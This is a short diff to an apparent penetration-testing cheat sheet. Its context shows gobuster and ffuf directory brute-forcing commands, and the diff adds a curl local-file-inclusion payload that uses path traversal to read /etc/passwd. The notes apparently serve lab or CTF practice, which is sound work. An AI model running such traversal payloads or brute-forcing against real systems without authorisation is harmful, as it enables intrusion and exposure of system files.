@@ -38,3 +38,8 @@ sudo gobuster dir -u http://10.129.156.21/ -w /usr/share/wordlists/dirb/common.t
 ```
 ffuf -w /usr/share/wordlists/dirbuster/directory-lists-2.3-medium.txt:FUZZ -u http://<IP>/FUZZ
 ```
+
+## LFI
+```
+curl 'http://{target_IP}/?file=../../../../etc/passwd'
+```
